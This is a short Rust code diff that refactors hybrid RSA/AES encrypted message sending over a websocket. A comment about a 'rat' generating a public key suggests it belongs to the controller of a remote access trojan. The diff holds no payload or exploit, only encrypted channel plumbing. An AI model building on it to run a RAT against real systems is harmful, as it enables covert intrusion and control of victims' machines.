@@ -88,22 +88,23 @@ impl Instance {
     pub fn set_private_key(&mut self, private_key: RsaPrivateKey) {
         self.private_key = Some(private_key);
     }
-    pub fn is_keys_init(&self) -> bool {
-        if self.public_key.is_none() || self.private_key.is_none() {
-            return false;
-        }
-        true
-    }
     pub async fn send_message(&mut self, message: &str) {
         self.write.send(Message::from(message)).await.unwrap();
     }
     pub async fn send_encrypted_message(&mut self, message: &str) {
-        let encrypted_data = encrypt_data(self.public_key.clone().unwrap(), message.as_bytes());
-        //dont need hex cuz Aes
-        self.write
-            .send(Message::from(encrypted_data))
-            .await
-            .unwrap();
+        let hybrid_encryption_result = encrypt_data_combined(
+            self.public_key.clone().unwrap(),
+            message.as_bytes().to_vec(),
+        );
+        self.send_hybrid_encryption(hybrid_encryption_result).await;
+    }
+    async fn send_hybrid_encryption(&mut self, hybrid_encryption_result: HybridEncryptionResult) {
+        self.send_message(hybrid_encryption_result.get_encrypted_key().as_str())
+            .await;
+        self.send_message(hybrid_encryption_result.get_nonce().as_str())
+            .await;
+        self.send_message(hybrid_encryption_result.get_encrypted_data().as_str())
+            .await;
     }
     pub async fn init_keys(&mut self) -> (String, String) {
         //Send pong for rat to generate a public key
@@ -132,12 +133,7 @@ impl Instance {
                     .unwrap()
                     .into(),
             );
-            self.send_message(hybrid_encryption_result.get_encrypted_key().as_str())
-                .await;
-            self.send_message(hybrid_encryption_result.get_nonce().as_str())
-                .await;
-            self.send_message(hybrid_encryption_result.get_encrypted_data().as_str())
-                .await;
+            self.send_hybrid_encryption(hybrid_encryption_result).await;
         }
         println!("rsa init sequence with complete");
         (public_key, private_key_string)
